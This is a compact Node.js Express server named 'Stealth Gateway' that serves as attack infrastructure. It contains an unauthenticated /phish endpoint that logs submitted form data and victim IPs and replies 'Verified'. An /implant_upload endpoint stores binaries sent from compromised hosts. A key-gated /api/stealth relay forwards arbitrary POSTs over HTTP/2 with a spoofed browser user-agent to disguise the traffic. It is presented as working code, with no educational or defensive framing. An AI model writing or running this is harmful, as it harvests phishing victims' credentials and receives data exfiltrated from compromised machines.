'use strict';
const http2=require('http2'),fs=require('fs'),path=require('path'),crypto=require('crypto'),os=require('os');
let express; try{express=require('express')}catch(e){console.error('need express');process.exit(1)}
const KEY=process.env.DM_GATEWAY_KEY||crypto.createHmac('sha256',os.hostname()).update('eni-gw').digest('hex').slice(0,32);
const app=express(); app.use(express.json({limit:'10mb'})); app.use(express.urlencoded({extended:true}));
app.use((req,res,next)=>{if(['/health','/phish','/implant_upload'].includes(req.path))return next();if(req.headers['x-matrix-key']!==KEY)return res.status(401).json({error:'unauth'});next()});
const CIPHERS='TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256';
async function stealthPost(url,payload){const u=new URL(url);return new Promise((res,rej)=>{const c=http2.connect(u.origin,{ciphers:CIPHERS,minVersion:'TLSv1.3',timeout:15000});c.on('error',rej);const body=JSON.stringify(payload);const r=c.request({':method':'POST',':path':u.pathname+u.search,'content-type':'application/json','content-length':Buffer.byteLength(body),'user-agent':'Mozilla/5.0 Chrome/120.0.0.0 Safari/537.36'});let d='';r.on('response',h=>{r.on('data',x=>d+=x);r.on('end',()=>{c.close();res({status:h[':status'],body:d.slice(0,5000)})})});r.on('error',e=>{c.close();rej(e)});r.write(body);r.end()})}
app.post('/api/stealth',async(req,res)=>{try{const{url,payload}=req.body||{};if(!url)return res.status(400).json({error:'missing url'});res.json({success:true,...(await stealthPost(url,payload||{}))})}catch(e){res.status(500).json({error:String(e.message||e)})}});
app.post('/phish',(req,res)=>{const dir=path.join(process.env.HOME||'.','oh-stack','workspace','phish');fs.mkdirSync(dir,{recursive:true});fs.appendFileSync(path.join(dir,'captures.jsonl'),JSON.stringify({ts:Date.now(),ip:req.ip,body:req.body})+'\n');res.send('<h2>Verified</h2>')});
app.post('/implant_upload',(req,res)=>{const dir=path.join(process.env.HOME||'.','oh-stack','workspace','implant');fs.mkdirSync(dir,{recursive:true});let chunks=[];req.on('data',c=>chunks.push(c));req.on('end',()=>{fs.writeFileSync(path.join(dir,'upload_'+Date.now()+'.bin'),Buffer.concat(chunks));res.json({ok:true})})});
app.get('/health',(_q,res)=>res.json({status:'ok'}));
app.listen(process.env.DM_API_PORT?+process.env.DM_API_PORT:8820,'0.0.0.0',()=>console.log('Stealth Gateway :8820'));
